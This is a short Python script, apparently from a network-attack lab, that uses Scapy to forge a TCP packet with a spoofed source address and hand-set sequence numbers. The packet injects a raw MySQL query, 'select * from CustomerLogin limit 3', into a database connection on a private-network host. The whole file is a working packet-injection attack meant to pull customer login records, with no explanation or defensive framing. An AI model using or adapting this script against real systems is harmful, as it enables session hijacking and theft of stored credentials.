from scapy.all import *

payload = "2500000003".decode('hex')+"select * from CustomerLogin limit 3;"
send(IP(dst="192.168.37.133",src="192.168.37.1")/TCP(sport=64872,dport=3306,flags=24,seq=1000,ack=1000)/payload,iface="eth0")